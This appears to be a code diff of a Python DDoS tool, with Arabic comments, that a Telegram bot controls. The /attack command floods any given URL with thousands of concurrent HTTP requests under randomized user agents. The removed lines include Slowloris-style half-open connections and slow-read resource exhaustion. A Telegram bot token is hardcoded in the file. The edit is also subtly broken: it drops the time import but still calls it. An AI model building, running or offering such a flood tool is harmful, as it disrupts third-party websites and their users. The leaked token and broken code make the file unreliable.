@@ -1,175 +1,138 @@
 import asyncio
 import aiohttp
 import random
-import socket
-import time
-from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor
 from fake_useragent import UserAgent
 import telebot
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 
 # إعدادات النظام
-MAX_THREADS = 8000  # عدد الخيوط
-SECONDARY_REQUEST_LIMIT = 100000  # حد الطلبات الثانوية
-ANALYSIS_MODE = True  # تحليل تلقائي للثغرات
+MAX_THREADS = 8000
+REQUEST_TIMEOUT = 30
+MAX_RETRIES = 5
+REPORT_SENT = False  # متغير لتتبع إرسال التقرير
 
 # متغيرات التحكم
 stop_system = False
-attack_phase = 0  # 0: تحليل أولي، 1: هجوم متقدم
-
-# إنشاء كائن UserAgent
 ua = UserAgent()
 
-class SiteAnalyzer:
-    @staticmethod
-    async def analyze_site(url):
-        """تحليل الموقع للثغرات المحتملة"""
-        analysis_results = {
-            'sql_injection': False,
-            'open_ports': [],
-            'admin_panel': None
-        }
-        
-        # التحقق من لوحة الإدارة (نظري)
-        common_admin_paths = ['/admin', '/wp-admin', '/administrator']
-        for path in common_admin_paths:
+class AttackManager:
+    def __init__(self, bot, chat_id):
+        self.session = None
+        self.active_tasks = []
+        self.bot = bot
+        self.chat_id = chat_id
+        self.start_time = None
+        self.request_count = 0
+    
+    async def create_session(self):
+        connector = aiohttp.TCPConnector(limit=0, force_close=True)
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+    
+    async def send_request(self, target):
+        global REPORT_SENT
+        retry_count = 0
+        while not stop_system and retry_count < MAX_RETRIES:
             try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(url + path) as resp:
-                        if resp.status == 200:
-                            analysis_results['admin_panel'] = url + path
-            except:
-                pass
-        
-        return analysis_results
-
-class AdvancedTechniques:
-    @staticmethod
-    async def resource_exhaustion(target):
-        """استنزاف موارد الخادم (نظري)"""
-        try:
-            # إنشاء اتصالات طويلة الأمد
-            reader, writer = await asyncio.open_connection(
-                urlparse(target).hostname, 80)
-            
-            # إرسال طلب غير مكتمل
-            writer.write(
-                f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
-            await writer.drain()
-            
-            # الحفاظ على الاتصال مفتوحًا
-            while not stop_system:
+                headers = {
+                    'User-Agent': ua.random,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Connection': 'keep-alive',
+                    'Referer': 'https://www.google.com/',
+                    'Cache-Control': 'no-cache'
+                }
+                
+                async with self.session.get(target, headers=headers) as response:
+                    await response.read()
+                    self.request_count += 1
+                    
+                    # إرسال التقرير مرة واحدة فقط بعد 1000 طلب
+                    if self.request_count > 10000 and not REPORT_SENT:
+                        REPORT_SENT = True
+                        duration = int(time.time() - self.start_time)
+                        report = (
+                            f"📊 تقرير أولي:\n"
+                            f"• عدد الطلبات: {self.request_count}\n"
+                            f"• المدة: {duration} ثانية\n"
+                            f"• الحالة: قيد التشغيل"
+                        )
+                        await self.bot.send_message(self.chat_id, report)
+                    
+                    await asyncio.sleep(random.uniform(0.1, 0.3))
+                    
+            except Exception as e:
+                retry_count += 1
                 await asyncio.sleep(1)
-        except:
-            pass
-        finally:
-            try:
-                writer.close()
-                await writer.wait_closed()
-            except:
-                pass
-
-    @staticmethod
-    async def sophisticated_request(target):
-        """طلبات متطورة غير تقليدية"""
-        headers = {
-            'User-Agent': ua.random,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        }
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(target, headers=headers) as resp:
-                    # قراءة البيانات ببطء لاستنزاف الموارد
-                    data = await resp.content.read(1024)
-                    while data and not stop_system:
-                        await asyncio.sleep(5)  # تأخير متعمد
-                        data = await resp.content.read(1024)
-        except:
-            pass
-
-class SecondaryRequests:
-    @staticmethod
-    async def send_requests(target):
-        """إرسال الطلبات التقليدية كخيار ثانوي"""
-        headers = {
-            'User-Agent': ua.random,
-            'Accept': '*/*',
-            'Connection': 'keep-alive'
-        }
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(target, headers=headers) as resp:
-                    await resp.text()
-        except:
-            pass
-
-async def attack_controller(target):
-    """وحدة التحكم الرئيسية في النظام"""
-    global attack_phase, stop_system
     
-    # التحليل الأولي
-    if ANALYSIS_MODE:
-        analysis = await SiteAnalyzer.analyze_site(target)
-        if analysis['admin_panel']:
-            print(f"تم اكتشاف لوحة إدارة: {analysis['admin_panel']}")
+    async def start_attack(self, target, num_threads):
+        self.start_time = time.time()
+        await self.create_session()
+        self.active_tasks = [self.send_request(target) for _ in range(num_threads)]
+        await asyncio.gather(*self.active_tasks)
     
-    # المرحلة الأولى: تقنيات متقدمة
-    attack_phase = 1
-    advanced_tasks = []
-    for _ in range(MAX_THREADS // 2):
-        advanced_tasks.append(AdvancedTechniques.resource_exhaustion(target))
-        advanced_tasks.append(AdvancedTechniques.sophisticated_request(target))
-    
-    await asyncio.gather(*advanced_tasks)
-    await asyncio.sleep(60)  # فترة اختبار التقنيات المتقدمة
-    
-    # التحول للطلبات التقليدية إذا لم يتعطل الموقع
-    if not stop_system:
-        print("التحول للوضع الثانوي: طلبات HTTP مكثفة")
-        request_tasks = []
-        for _ in range(MAX_THREADS):
-            request_tasks.append(SecondaryRequests.send_requests(target))
-        
-        await asyncio.gather(*request_tasks)
+    async def cleanup(self):
+        if self.session:
+            await self.session.close()
 
-def run_system(target):
-    """تشغيل النظام في خيوط منفصلة"""
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(attack_controller(target))
-        loop.close()
+async def run_attack(target, bot, chat_id):
+    manager = AttackManager(bot, chat_id)
+    try:
+        await manager.start_attack(target, MAX_THREADS)
+    finally:
+        await manager.cleanup()
+        # إرسال تقرير الإيقاف النهائي
+        if not stop_system:  # إذا توقف بسبب خطأ وليس بأمر /stop
+            duration = int(time.time() - manager.start_time)
+            report = (
+                f"🛑 توقف غير متوقع:\n"
+                f"• إجمالي الطلبات: {manager.request_count}\n"
+                f"• المدة الكلية: {duration} ثانية"
+            )
+            await bot.send_message(chat_id, report)
 
-# واجهة بوت التليجرام
+def start_attack_thread(target, bot, chat_id):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(run_attack(target, bot, chat_id))
+    loop.close()
+
+# إعداد بوت التليجرام
 bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=['start', 'help'])
 def handle_start(message):
-    bot.reply_to(message, "نظام البحث الأمني المتقدم - لأغراض أكاديمية فقط")
+    bot.reply_to(message, "أهلاً! أوامر النظام:\n"
+                         "/attack [رابط] - بدء الاختبار\n"
+                         "/stop - إيقاف الاختبار")
 
-@bot.message_handler(commands=['analyze'])
-def handle_analyze(message):
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
+    global stop_system, REPORT_SENT
     try:
         target = message.text.split()[1]
         if not target.startswith(('http://', 'https://')):
-            bot.reply_to(message, "الرابط يجب أن يبدأ بـ http:// أو https://")
+            bot.reply_to(message, "يجب أن يبدأ الرابط بـ http:// أو https://")
             return
         
-        bot.reply_to(message, f"بدء التحليل الأمني لـ {target}")
-        ThreadPoolExecutor(max_workers=MAX_THREADS).submit(run_system, target)
+        stop_system = False
+        REPORT_SENT = False
+        bot.reply_to(message, f"⚡ بدء الاختبار على {target}...")
+        ThreadPoolExecutor(max_workers=1).submit(
+            start_attack_thread, 
+            target, 
+            bot, 
+            message.chat.id
+        )
     except IndexError:
-        bot.reply_to(message, "الاستخدام: /analyze [رابط الموقع]")
+        bot.reply_to(message, "الاستخدام: /attack [رابط الموقع]")
 
 @bot.message_handler(commands=['stop'])
 def handle_stop(message):
     global stop_system
     stop_system = True
-    bot.reply_to(message, "تم إيقاف جميع العمليات")
+    bot.reply_to(message, "🛑 تم إيقاف الاختبار بنجاح")
 
 if __name__ == "__main__":
     bot.polling()
